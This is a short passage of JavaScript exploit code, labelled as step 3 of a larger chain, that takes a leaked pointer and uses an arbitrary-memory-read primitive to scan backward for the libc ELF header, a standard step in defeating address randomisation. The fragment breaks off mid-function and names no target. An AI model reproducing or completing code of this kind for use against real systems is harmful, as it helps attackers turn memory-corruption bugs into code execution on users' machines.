// -------------------- 3) find libc base by scanning for ELF header --------------------
function find_libc_base(leak) {
  let leakPage = leak & ~0xfffn;
  const scan = 0x400000; // 4MB
  let start = leakPage - BigInt(scan);

  let mem = make_arb_u64_view(start & ~7n, scan + 0x2000);
